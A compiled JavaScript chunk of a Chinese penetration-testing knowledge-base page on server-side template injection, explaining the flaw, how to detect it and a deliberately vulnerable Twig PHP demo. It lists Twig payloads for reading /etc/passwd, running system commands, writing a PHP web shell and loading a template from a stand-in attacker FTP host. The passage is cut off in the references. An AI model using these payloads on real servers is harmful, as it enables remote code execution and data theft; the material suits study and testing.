"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[2253],{1385:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20211104114233777-d235322f9dee7d6e20750a0c473ef19f.png"},13287:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>t,contentTitle:()=>c,default:()=>j,frontMatter:()=>d,metadata:()=>i,toc:()=>a});const i=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SSTI\u6ce8\u5165/README","title":"SSTI","description":"A Pentester&#39;s Guide to Server Side Template Injection (SSTI) | Cobalt Blog","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/21.SSTI\u6ce8\u5165/README.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/21.SSTI\u6ce8\u5165","slug":"/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SSTI\u6ce8\u5165/","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SSTI\u6ce8\u5165/","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts","lastUpdatedAt":1748784450000,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"XS-Leaks","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XS-Leaks/"},"next":{"title":"GraphQL\u5b89\u5168\u6d4b\u8bd5","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/GraphQL\u6d4b\u8bd5/"}}');var l=s(74848),r=s(28453);const d={},c="SSTI",t={},a=[{value:"\u4ec0\u4e48\u662fSSTI",id:"\u4ec0\u4e48\u662fssti",level:2},{value:"\u4ec0\u4e48\u662f\u6a21\u7248/\u6a21\u7248\u5f15\u64ce",id:"\u4ec0\u4e48\u662f\u6a21\u7248\u6a21\u7248\u5f15\u64ce",level:2},{value:"\u6316\u6398\u548c\u5224\u5b9a",id:"\u6316\u6398\u548c\u5224\u5b9a",level:2},{value:"\u5df2\u77e5\u6a21\u7248\u5f15\u64ce\u95ee\u9898",id:"\u5df2\u77e5\u6a21\u7248\u5f15\u64ce\u95ee\u9898",level:2},{value:"PHP\u4e2d\u7684SSTI",id:"php\u4e2d\u7684ssti",level:2},{value:"Twig",id:"twig",level:3},{value:"\u57fa\u7840\u8bed\u6cd5",id:"\u57fa\u7840\u8bed\u6cd5",level:4},{value:"\u73af\u5883\u642d\u5efa",id:"\u73af\u5883\u642d\u5efa",level:4},{value:"\u6f0f\u6d1e\u5229\u7528",id:"\u6f0f\u6d1e\u5229\u7528",level:4},{value:"\u53c2\u8003",id:"\u53c2\u8003",level:4},{value:"Smarty",id:"smarty",level:3},{value:"Python\u4e2d\u7684SSTI",id:"python\u4e2d\u7684ssti",level:2},{value:"Jinja2",id:"jinja2",level:3},{value:"\u57fa\u7840\u8bed\u6cd5",id:"\u57fa\u7840\u8bed\u6cd5-1",level:4},{value:"\u73af\u5883\u642d\u5efa",id:"\u73af\u5883\u642d\u5efa-1",level:4},{value:"\u6f0f\u6d1e\u5224\u5b9a",id:"\u6f0f\u6d1e\u5224\u5b9a",level:4},{value:"\u6df1\u5165\u4e86\u89e3",id:"\u6df1\u5165\u4e86\u89e3",level:4},{value:"\u52a0\u6df1\u5229\u7528",id:"\u52a0\u6df1\u5229\u7528",level:4},{value:"\u7ed5\u8fc7",id:"\u7ed5\u8fc7",level:4},{value:"\u53c2\u8003",id:"\u53c2\u8003-1",level:4},{value:"tornado",id:"tornado",level:3},{value:"Djanjo",id:"djanjo",level:3},{value:"Mako",id:"mako",level:3},{value:"Java\u4e2d\u7684SSTI",id:"java\u4e2d\u7684ssti",level:2},{value:"Velocity",id:"velocity",level:3},{value:"FreeMarker",id:"freemarker",level:3},{value:"Spring View Manipulation",id:"spring-view-manipulation",level:3},{value:"Pebble",id:"pebble",level:3},{value:"Jinjava",id:"jinjava",level:3},{value:"NodeJS\u4e2d\u7684SSTI",id:"nodejs\u4e2d\u7684ssti",level:2},{value:"Handlebars",id:"handlebars",level:3},{value:"JsRender",id:"jsrender",level:3},{value:"PugJs",id:"pugjs",level:3},{value:"Ruby\u4e2d\u7684SSTI",id:"ruby\u4e2d\u7684ssti",level:2},{value:"ERB",id:"erb",level:3},{value:"Slim",id:"slim",level:3},{value:"\u81ea\u52a8\u5316\u5de5\u5177",id:"\u81ea\u52a8\u5316\u5de5\u5177",level:2},{value:"\u53c2\u8003",id:"\u53c2\u8003-2",level:2}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.header,{children:(0,l.jsx)(n.h1,{id:"ssti",children:"SSTI"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"A Pentester&#39;s Guide to Server Side Template Injection (SSTI) | Cobalt Blog",src:s(50807).A+"",width:"1200",height:"746"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:"https://img.shields.io/badge/d4m1ts-2021-ff751a?logo=Ethereum&logoColor=3C3C3D&labelColor=bfbfbf",alt:"d4m1ts_2021"})}),"\n",(0,l.jsx)(n.h2,{id:"\u4ec0\u4e48\u662fssti",children:"\u4ec0\u4e48\u662fSSTI"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"SSTI(Server Side Template Injection)"}),"\u5168\u79f0\u670d\u52a1\u7aef\u6a21\u677f\u6ce8\u5165\uff0c\u65e2\u7136\u662f\u6ce8\u5165\uff0c\u90a3\u5c31\u8bf4\u660e\u662f\u6267\u884c\u4e86\u67d0\u4e9b\u6076\u610f\u4ee3\u7801\u5bfc\u81f4\u7684\u95ee\u9898\uff1b"]}),"\n",(0,l.jsxs)(n.p,{children:["\u6f0f\u6d1e\u6210\u56e0\u662f\u670d\u52a1\u7aef\u63a5\u6536\u4e86\u653b\u51fb\u8005\u7684\u6076\u610f\u8f93\u5165\u4ee5\u540e\uff0c\u672a\u7ecf\u4efb\u4f55\u5904\u7406\u5c31\u5c06\u5176\u4f5c\u4e3aWeb\u5e94\u7528\u6a21\u677f\u5185\u5bb9\u7684\u4e00\u90e8\u5206\uff0c",(0,l.jsx)(n.code,{children:"\u6a21\u677f\u5f15\u64ce"}),"\u5728\u8fdb\u884c\u76ee\u6807\u7f16\u8bd1\u6e32\u67d3\u7684\u8fc7\u7a0b\u4e2d(\u4e00\u822c\u53ef\u4ee5\u6267\u884c\u5404\u79cd\u8868\u8fbe\u5f0f)\uff0c\u6267\u884c\u4e86\u653b\u51fb\u8005\u63d2\u5165\u7684\u53ef\u4ee5\u7834\u574f\u6a21\u677f\u7ed3\u6784\u7684\u8bed\u53e5(",(0,l.jsx)(n.code,{children:"\u6076\u610fPayload"}),")\uff0c\u56e0\u800c\u53ef\u80fd\u5bfc\u81f4\u4e86\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u3001\u4ee3\u7801\u6267\u884c\u3001GetShell\u7b49\u95ee\u9898\u3002\u5176\u5f71\u54cd\u8303\u56f4\u4e3b\u8981\u53d6\u51b3\u4e8e\u6a21\u7248\u5f15\u64ce\u7684\u590d\u6742\u6027\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u7b80\u5355\u6765\u8bf4\uff0c\u5c31\u662f\u7ed9\u653b\u51fb\u8005\u4f20\u5165\u7684\u6570\u636e\u5f53\u6210\u4e86\u6a21\u7248\u6765\u6e32\u67d3\uff0c\u800c\u4e0d\u662f\u5f53\u6210\u6570\u636e\u53bb\u6e32\u67d3\u3002"}),"\n",(0,l.jsx)(n.h2,{id:"\u4ec0\u4e48\u662f\u6a21\u7248\u6a21\u7248\u5f15\u64ce",children:"\u4ec0\u4e48\u662f\u6a21\u7248/\u6a21\u7248\u5f15\u64ce"}),"\n",(0,l.jsxs)(n.p,{children:["\u521a\u624d\u63d0\u5230\u4e86\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\u662f\u56e0\u4e3a",(0,l.jsx)(n.code,{children:"\u6a21\u7248\u5f15\u64ce"}),"\u5c06\u653b\u51fb\u8005\u6784\u9020\u7684\u6076\u610fpayload\u5728\u670d\u52a1\u7aef\u6309\u4ee3\u7801\u8bed\u4e49\u89e3\u6790\u6267\u884c\uff0c",(0,l.jsx)(n.strong,{children:"\u90a3\u4ec0\u4e48\u662f\u6a21\u7248\uff0c\u4ec0\u4e48\u53c8\u662f\u6a21\u7248\u5f15\u64ce\u5462\uff1f"})]}),"\n",(0,l.jsx)(n.p,{children:"\u76ee\u524d\u4e3b\u6d41\u7684web\u5f00\u53d1\u4e3b\u8981\u5206\u4e3a\u4ee5\u4e0b\u4e24\u79cd\u6280\u672f\uff1a"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"\u524d\u540e\u7aef\u4e0d\u5206\u79bb"}),"\uff1a\u5373\u540e\u7aef\u5b8c\u6210\u8def\u7531\uff0c\u7528\u6237\u5728\u6d4f\u89c8\u5668\u8f93\u5165\u4e00\u4e2aurl\uff0c\u8bbf\u95ee\u7684\u662f\u540e\u7aef\u8def\u7531\uff08\u670d\u52a1\u7aef\u54cd\u5e94\uff09\uff0c\u540e\u7aef\u63a5\u6536\u8bf7\u6c42\u540e\uff0c\u518d\u5c06\u6570\u636e\u901a\u8fc7**",(0,l.jsx)(n.code,{children:"\u6a21\u677f\u5f15\u64ce"}),"**\u89e3\u6790\u518d\u6e32\u67d3\u6210\u89c6\u56fe\u8fd4\u56de\u7ed9\u524d\u7aef\u3002\u540e\u7aef\u8def\u7531\uff0c\u7531\u540e\u7aef\u6e32\u67d3\u6570\u636e\uff0c\u518d\u8fd4\u56de\u89c6\u56fe\u7ed9\u524d\u7aef\uff0c\u524d\u7aef\u53ea\u8d1f\u8d23\u5c55\u793a\u89c6\u56fe\uff0c\u6240\u6709\u7684\u4ea4\u4e92\u90fd\u5728\u540e\u53f0\uff1b",(0,l.jsx)(n.code,{children:"\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\u8bbf\u95ee\u4e00\u4e2aURL\u540e\u76f4\u63a5\u5f97\u5230html\u9875\u9762\u3002"})]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"\u524d\u540e\u7aef\u5206\u79bb"}),"\uff1a\u524d\u7aef\u4f7f\u7528JavaScript\u6846\u67b6\uff0c\u5982(jquery\uff0cvue\uff0creact\uff0cangular)\uff0c\u524d\u7aef\u9879\u76ee\u5316\uff1b\u540e\u7aef\u53bb\u6389\u6240\u6709\u7684\u89c6\u56fe\uff0c\u53ea\u63d0\u4f9bapi\u63a5\u53e3\uff0c\u7528\u6237\u5728\u6d4f\u89c8\u5668\u8bbf\u95ee\u7684\u8def\u7531\u4e3a\u524d\u7aef\u8def\u7531\uff08\u4e5f\u79f0\u4e3aHash\u8def\u7531\uff0c\u7531\u524d\u7aef\u54cd\u5e94\uff09\uff0c\u53ea\u52a0\u8f7d\u524d\u7aef\u89c6\u56fe\uff0c\u6570\u636e\u53ea\u901a\u8fc7ajax\u83b7\u53d6\uff0c\u524d\u7aef\u83b7\u53d6\u6570\u636e\u4e4b\u540e\u518d\u6e32\u67d3\u5230\u89c6\u56fe\uff0c\u524d\u7aef\u8d1f\u8d23\u63a7\u5236\u8def\u7531\uff0c\u5c55\u793a\u89c6\u56fe\uff0c\u540e\u7aef\u53ea\u8d1f\u8d23\u63d0\u4f9bapi\uff0c\u7528\u6237\u548c\u89c6\u56fe\u4ea4\u4e92\uff0c\u89c6\u56fe\u4e0a\u7684\u6309\u94ae\u4ee5\u53ca\u9875\u9762\u6570\u636e\u548c\u540e\u7aefapi\u4ea4\u4e92\uff1b",(0,l.jsx)(n.code,{children:"\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\u8bbf\u95ee\u4e00\u4e2aURL\u540e\u8fd4\u56de\u7684\u662fJSON\u7b49\u6570\u636e\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u5b8c\u5168\u6e32\u67d3\u597d\u7684html\u9875\u9762"})]}),"\n"]}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"\u4ece\u4e0a\u9762\u7684\u63cf\u8ff0\uff0c\u53ef\u4ee5\u770b\u51faSSTI\u4e3b\u8981\u5b58\u5728\u4e8e\u524d\u540e\u7aef\u4e0d\u5206\u79bb\u7684\u9879\u76ee\u4e2d\u3002"}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:["**",(0,l.jsx)(n.code,{children:"\u6a21\u677f"}),"\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u6bb5\u56fa\u5b9a\u597d\u683c\u5f0f\uff0c\u7b49\u7740\u4f60\u6765\u586b\u5145\u4fe1\u606f\u7684\u6587\u4ef6\u3002**\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u505a\u5230\u903b\u8f91\u4e0e\u89c6\u56fe\u5206\u79bb\uff0c\u66f4\u5bb9\u6613\u3001\u6e05\u695a\u4e14\u76f8\u5bf9\u5b89\u5168\u5730\u7f16\u5199\u524d\u540e\u7aef\u4e0d\u540c\u7684\u903b\u8f91\u3002\u4f5c\u4e3a\u5bf9\u6bd4\uff0c\u4e00\u4e2a\u5f88\u4e0d\u597d\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u901a\u8fc7\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u6765\u7ec4\u6210HTML\u6587\u4ef6\uff0c\u7136\u540e\u7edf\u4e00\u8f93\u51fa\u3002"]}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"\u6a21\u677f\u5f15\u64ce"}),"\uff08\u8fd9\u91cc\u7279\u6307\u7528\u4e8eWeb\u5f00\u53d1\u7684\u6a21\u677f\u5f15\u64ce\uff09\u662f\u4e3a\u4e86\u4f7f\u7528\u6237\u754c\u9762\u4e0e\u4e1a\u52a1\u6570\u636e\uff08\u5185\u5bb9\uff09\u5206\u79bb\u800c\u4ea7\u751f\u7684\uff0c\u5b83\u53ef\u4ee5\u751f\u6210\u7279\u5b9a\u683c\u5f0f\u7684\u6587\u6863\uff0c\u7528\u4e8e\u7f51\u7ad9\u7684\u6a21\u677f\u5f15\u64ce\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u6807\u51c6\u7684\u6587\u6863\uff0c",(0,l.jsx)(n.strong,{children:"\u7b80\u5355\u6765\u8bf4 \u5c31\u662f\u5c06\u6a21\u677f\u6587\u4ef6\u548c\u6570\u636e\u901a\u8fc7\u6a21\u677f\u5f15\u64ce\u7684\u6e32\u67d3\u751f\u6210\u6700\u7ec8\u7684HTML\u4ee3\u7801\u3002"})]}),"\n",(0,l.jsx)(n.p,{children:"\u6d41\u7a0b\u5982\u4e0b\u6240\u793a\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:s(73068).A+"",width:"662",height:"214"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"What is Server-Side Template Injection (SSTI)? - Indusface",src:s(36988).A+"",width:"729",height:"317"})}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"\u6a21\u677f\u5f15\u64ce\u4e5f\u4f1a\u63d0\u4f9b\u6c99\u7bb1\u673a\u5236\u6765\u8fdb\u884c\u6f0f\u6d1e\u9632\u8303\uff0c\u4f46\u662f\u53ef\u4ee5\u7528\u6c99\u7bb1\u9003\u9038\u6280\u672f\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002"}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"\u6316\u6398\u548c\u5224\u5b9a",children:"\u6316\u6398\u548c\u5224\u5b9a"}),"\n",(0,l.jsxs)(n.p,{children:["\u6700\u539f\u59cb\u7684\u65b9\u6cd5\u662f\u901a\u8fc7\u6ce8\u5165\u6a21\u677f\u8868\u8fbe\u5f0f\u4e2d\u5e38\u7528\u7684\u4e00\u7cfb\u5217\u7279\u6b8a\u5b57\u7b26\u6765\u5c1d\u8bd5\u6a21\u7cca\u6a21\u677f\uff0c\u4f8b\u5982",(0,l.jsx)(n.code,{children:"${{<%[%'\"}}%\\"}),"\uff0c\u5982\u679c\u51fa\u73b0\u5f02\u5e38\uff0c\u5219\u8868\u660e\u6ce8\u5165\u7684\u6a21\u677f\u8bed\u6cd5\u53ef\u80fd\u6b63\u5728\u4ee5\u67d0\u79cd\u65b9\u5f0f\u88ab\u670d\u52a1\u5668\u6e32\u67d3\u89e3\u6790\uff0c\u8fd9\u5c31\u662f\u53ef\u80fd\u5b58\u5728\u670d\u52a1\u5668\u7aef\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u7684\u4e00\u4e2a\u8ff9\u8c61\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u53d1\u73b0\u5b58\u5728\u4e86SSTI\uff0c\u90a3\u600e\u4e48\u5224\u65ad\u662f\u4ec0\u4e48\u6a21\u7248\u5f15\u64ce\u7684\u6ce8\u5165\u5462\uff1f"}),"\n",(0,l.jsx)(n.p,{children:"1\u3001\u62a5\u9519"}),"\n",(0,l.jsxs)(n.p,{children:["\u5927\u91cf\u7684\u6a21\u7248\u8bed\u8a00\u90fd\u662f\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4e00\u4e9b\u4e0d\u5e38\u89c4\u7684payload\u8ba9\u5176\u629b\u51fa\u5f02\u5e38\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u786e\u5b9a\u6a21\u7248\u5f15\u64ce\u751a\u81f3\u7248\u672c\u53f7\uff1b\u6bd4\u5982\u4f7f\u7528\u65e0\u6548\u8868\u8fbe\u5f0f",(0,l.jsx)(n.code,{children:"<%=foobar%>"}),"\u7ed9\u57fa\u4e8eRuby\u7684",(0,l.jsx)(n.code,{children:"ERB"}),"\u6a21\u7248\u5f15\u64ce\u89e3\u6790\u65f6\uff0c\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-exception",children:"(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)\nfrom /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'\nfrom /usr/lib/ruby/2.5.0/erb.rb:876:in `result'\nfrom -e:4:in `<main>'\n"})}),"\n",(0,l.jsx)(n.p,{children:"2\u3001\u6839\u636e\u6267\u884c\u7ed3\u679c"}),"\n",(0,l.jsx)(n.p,{children:"\u5982\u679c\u6ca1\u6709\u62a5\u9519\uff0c\u5c31\u53ea\u80fd\u6839\u636e\u6bcf\u4e2a\u6a21\u7248\u8bed\u8a00\u7684\u7279\u6027\u6765\u8bc6\u522b\u4e86\uff0c\u4e00\u79cd\u5e38\u89c1\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u6765\u81ea\u4e0d\u540c\u6a21\u677f\u5f15\u64ce\u7684\u8bed\u6cd5\u6ce8\u5165\u4efb\u610f\u6570\u5b66\u8fd0\u7b97\uff0c\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u6765\u5224\u65ad\uff0c\u6709\u4e00\u5f20\u51fa\u5708\u7684\u51b3\u7b56\u6811\u56fe\u5982\u4e0b\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"img",src:s(92340).A+"",width:"640",height:"386"})}),"\n",(0,l.jsx)(n.h2,{id:"\u5df2\u77e5\u6a21\u7248\u5f15\u64ce\u95ee\u9898",children:"\u5df2\u77e5\u6a21\u7248\u5f15\u64ce\u95ee\u9898"}),"\n",(0,l.jsx)(n.p,{children:"\u5df2\u77e5\u7684\u4e00\u4e9b\u6a21\u7248\u548c\u5176\u662f\u5426\u5b58\u5728\u95ee\u9898"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"img",src:s(65509).A+"",width:"732",height:"835"})}),"\n",(0,l.jsx)(n.h2,{id:"php\u4e2d\u7684ssti",children:"PHP\u4e2d\u7684SSTI"}),"\n",(0,l.jsx)(n.h3,{id:"twig",children:"Twig"}),"\n",(0,l.jsx)(n.p,{children:"Twig\u662f\u6765\u81ea\u4e8eSymfony\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u5b83\u975e\u5e38\u6613\u4e8e\u5b89\u88c5\u548c\u4f7f\u7528\u3002\u5b83\u7684\u64cd\u4f5c\u6709\u70b9\u50cfMustache\u548cliquid\u3002"}),"\n",(0,l.jsx)(n.h4,{id:"\u57fa\u7840\u8bed\u6cd5",children:"\u57fa\u7840\u8bed\u6cd5"}),"\n",(0,l.jsxs)(n.p,{children:["Twig\u6a21\u7248\n1\u3001\u4f7f\u7528\u53cc\u5927\u62ec\u53f7\u5206\u9694\u7b26",(0,l.jsx)(n.code,{children:"{{ }}"}),"\u8fdb\u884c\u8f93\u51fa\n2\u3001\u4f7f\u7528\u5927\u62ec\u53f7\u767e\u5206\u6bd4\u5b9a\u754c\u7b26",(0,l.jsx)(n.code,{children:"{% %}"}),"\u8fdb\u884c\u903b\u8f91\u8fd0\u7b97\n3\u3001\u4f7f\u7528",(0,l.jsx)(n.code,{children:"{# #}"}),"\u7528\u4e8e\u8bc4\u8bba\u3001\u6ce8\u91ca"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-twig",children:"{# \u6ce8\u91ca #}\n<ul>\n    {% for word in words %}\n        <li>{{ word }}</li>\n    {% endfor %}\n</ul>\n"})}),"\n",(0,l.jsx)(n.h4,{id:"\u73af\u5883\u642d\u5efa",children:"\u73af\u5883\u642d\u5efa"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://www.kancloud.cn/yunye/twig-cn/159457",children:"\u6559\u7a0b"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://github.com/twigphp/Twig/tags",children:"\u4e0b\u8f7d\u5730\u5740"})}),"\n",(0,l.jsxs)(n.p,{children:["\u6ce8\u610f\uff1a\u57282.0.0\u7248\u672c\u4e2d\uff0c\u79fb\u9664\u4e86",(0,l.jsx)(n.code,{children:"Autoloader"}),"\uff0c\u4f46\u662f\u7f51\u4e0a\u5f88\u591a\u5343\u7bc7\u4e00\u5f8b\u7684twig SSTI\u642d\u73af\u5883\u90fd\u6ca1\u8bb2\u8fd9\u4e2a\uff0c\u5c31\u4f1a\u51fa\u95ee\u9898\u3002\u3002\u3002\u6240\u4ee5\u6211\u4eec\u4e0b\u8f7d\u4e2a",(0,l.jsx)(n.a,{href:"https://github.com/twigphp/Twig/releases/tag/v1.35.0",children:"v1.35.0"})]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211104114233777",src:s(1385).A+"",width:"1364",height:"836"})}),"\n"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u7ec4\u4ef6\u4fe1\u606f"}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{children:"\u4f7f\u7528\u7ec4\u4ef6"}),(0,l.jsx)(n.th,{children:"\u7248\u672c"})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Twig"}),(0,l.jsx)(n.td,{children:"1.35.0"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"php"}),(0,l.jsx)(n.td,{children:"7.3.24"})]})]})]}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:"\u5229\u7528\u4ee3\u7801"}),"\n",(0,l.jsxs)(n.p,{children:["\u5b83\u7684",(0,l.jsx)(n.code,{children:"render()"}),"\u65b9\u6cd5\u901a\u8fc7\u5176\u7b2c\u4e00\u4e2a\u53c2\u6570\u8f7d\u5165\u6a21\u677f\uff0c\u5e76\u901a\u8fc7\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e2d\u7684\u53d8\u91cf\u6765\u4f20\u503c\u6e32\u67d3\u6a21\u677f\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u5982\u679c\u6e32\u67d3\u7684\u6a21\u7248\u5185\u5bb9\u53d7\u5230\u7528\u6237\u7684\u63a7\u5236\uff0c\u90a3\u4e48\u5c31\u4f1a\u5b58\u5728\u6f0f\u6d1e\u3002"]}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'<?php\n    require_once(dirname(__FILE__).\'/Twig-1.35.0/lib/Twig/Autoloader.php\');\n    Twig_Autoloader::register(true);\n    $twig = new Twig_Environment(new Twig_Loader_String());\n    // $output = $twig->render("Hello {{name}}", array("name" => $_GET["name"]));  // \u4e0d\u5b58\u5728SSTI\u60c5\u51b5\n    $output = $twig->render("Hello {$_GET[\'name\']}");  // \u5c06\u7528\u6237\u8f93\u5165\u4f5c\u4e3a\u6a21\u7248\u53d8\u91cf\u7684\u503c\n    echo $output;\n?>\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5feb\u901f\u542f\u52a8PHP web\u73af\u5883"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"php -S 127.0.0.1:9999\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5927\u529f\u544a\u6210"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211104113759413",src:s(56160).A+"",width:"838",height:"182"})}),"\n",(0,l.jsx)(n.h4,{id:"\u6f0f\u6d1e\u5229\u7528",children:"\u6f0f\u6d1e\u5229\u7528"}),"\n",(0,l.jsx)(n.p,{children:"\u524d\u9762\u4e5f\u8bf4\u4e86\u4e00\u822c\u6a21\u7248\u7684\u6e32\u67d3\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u6267\u884c\u8868\u8fbe\u5f0f"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u57fa\u7840Payload"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-twig",children:"{{2*2**3}} = 16\n{# \u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\uff0c#\u8981\u5199\u6210%23\uff0c\u4e0d\u7136\u4f1a\u88ab\u6d4f\u89c8\u5668\u5f53\u6210\u951a\u70b9 #}\n{{2*2**3}}{%23%20\u6ce8\u91ca\u4e0d\u4f1a\u663e\u793a%20%23} = 16\n${7*7} = ${7*7}\n{{7*'7'}} = 49\n{{1/0}} = Error\n{{foobar}} Nothing\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20211104113823340",src:s(35767).A+"",width:"926",height:"182"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5176\u4ed6\u7684\u4e00\u4e9b\u9ad8\u98ce\u9669payload\uff0c\u672c\u5730\u90fd\u6ca1\u6709\u6d4b\u8bd5\u6210\u529f\uff0c\u6000\u7591\u53ef\u80fd\u662fTwig\u7248\u672c\u7684\u95ee\u9898\uff1f"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-twig",children:'{# Get Info #}\n{{_self}} #(Ref. to current application)\n{{_self.env}}\n{{dump(app)}}\n{{app.request.server.all|join(\',\')}}\n\n{# File read #}\n"{{\'/etc/passwd\'|file_excerpt(1,30)}}"@\n\n{# Exec code #}\n{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}\n{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}\n{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}\n{{[\'id\']|filter(\'system\')}}\n{{[\'cat\\x20/etc/passwd\']|filter(\'system\')}}\n{{[\'cat$IFS/etc/passwd\']|filter(\'system\')}}\n{{["id"]|map("system")|join(",")\n{{["id", 0]|sort("system")|join(",")}}\n{{["id"]|filter("system")|join(",")}}\n{{[0, 0]|reduce("system", "id")|join(",")}}\n{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}\n'})}),"\n",(0,l.jsx)(n.h4,{id:"\u53c2\u8003",children:"\u53c2\u8003"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php",children:"ssti-server-side-template-injection#twig-php"})}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://xz.aliyun.com/t/7518",children:"TWIG \u5168\u7248\u672c\u901a\u7528 SSTI 